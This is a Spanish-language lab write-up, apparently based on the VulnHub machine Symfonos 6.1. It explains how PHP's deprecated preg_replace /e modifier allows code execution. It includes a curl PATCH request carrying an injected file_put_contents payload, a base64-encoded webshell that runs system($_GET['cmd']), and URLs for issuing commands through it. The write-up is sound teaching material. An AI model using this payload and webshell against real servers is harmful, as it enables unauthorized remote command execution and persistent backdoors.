
---

# Explotación de vulnerabilidad con `preg_replace /e` y uso de `file_put_contents`

## Contexto del ataque

Hemos explotado una API vulnerable que nos permitía modificar el contenido de la web. El origen de la vulnerabilidad se encuentra en el uso inseguro de la función `preg_replace` con el modificador `/e`, el cual evalúa el contenido como código PHP. Este modificador fue **deprecado en PHP 5.5 y eliminado en PHP 7**, precisamente porque abre la puerta a ejecuciones de código arbitrario.

El ataque consistió en enviar una petición `PATCH` a la API con un payload malicioso que aprovechaba esta vulnerabilidad para ejecutar código en el servidor.

**Nota:** para este ejemplo nos servimos de la explotación realizada en la [Máquina Symfonos 6.1](https://www.vulnhub.com/entry/symfonos-61,458/)

## Código vulnerable

```php
<div class="container">
    <div class="col-md-12">
        <?php
        while ($row = mysqli_fetch_assoc($result)) {
            $content = htmlspecialchars($row['text']);
            
            echo $content;
        
            preg_replace('/.*/e',$content, "Win");
        }
        ?>
    </div>
</div>
````

En este fragmento, la entrada del usuario (`$row['text']`) termina siendo ejecutada como código PHP debido al modificador `/e`. Aunque se intenta sanitizar con `htmlspecialchars`, esa sanitización afecta solo a lo que se imprime con `echo`, no al `preg_replace`. El `preg_replace` evalúa directamente el contenido de `$content` y nos permite inyectar código arbitrario.

## Petición enviada

El payload se inyectó a través de una petición `PATCH`:

```bash
curl -s -X PATCH "http://<IP_OBJETIVO>:5000/ls2o4g/v1.0/posts/1" \
 -H "Content-Type: application/json" \
 -b "token=<JWT>" \
 -d $'{"text": "file_put_contents(\'cmd.php\', base64_decode(\'PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\'))"}'
```

En este caso, el campo `text` contiene código PHP que será ejecutado por el `preg_replace` vulnerable.

## Payload utilizado

El payload que se ejecuta en el servidor es:

```php
file_put_contents('cmd.php', base64_decode('PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K'))
```

### Explicación

1. **`file_put_contents()`**  
    Es una función nativa de PHP que escribe datos en un archivo. En este caso:
    
    - El primer argumento `'cmd.php'` indica el nombre del archivo a crear.
        
    - El segundo argumento es el contenido que se va a escribir.
        
    
    Esta función simplifica lo que antes se hacía con `fopen` + `fwrite` + `fclose`.
    
2. **`base64_decode()`**  
    Dentro de `file_put_contents` se decodifica un payload en base64. Ese payload corresponde al siguiente código PHP:
    
    ```php
    <?php
      system($_GET['cmd']);
    ?>
    ```
    
    Este es un webshell muy simple que ejecuta cualquier comando del sistema que se le pase como parámetro `cmd` en la URL.
    

### Resultado

Al ejecutar el payload, se crea en el servidor un archivo `cmd.php` con el siguiente contenido:

```php
<?php
  system($_GET['cmd']);
?>
```

De esta manera, conseguimos una puerta trasera persistente en el servidor y podemos ejecutar comandos de forma remota.

## Uso del webshell

Una vez creado `cmd.php`, podemos ejecutar comandos accediendo a la URL:

```
http://<IP>/cmd.php?cmd=whoami
http://<IP>/cmd.php?cmd=ls -la
```

Esto nos da control sobre el sistema comprometido.

## Conclusión

La vulnerabilidad se origina en el uso inseguro de `preg_replace` con el modificador `/e`, que permite la ejecución de código arbitrario. Aprovechamos esta debilidad para ejecutar un payload que crea un archivo malicioso mediante `file_put_contents`. El archivo generado (`cmd.php`) es un webshell que nos permite persistencia y ejecución remota de comandos en el servidor.

---
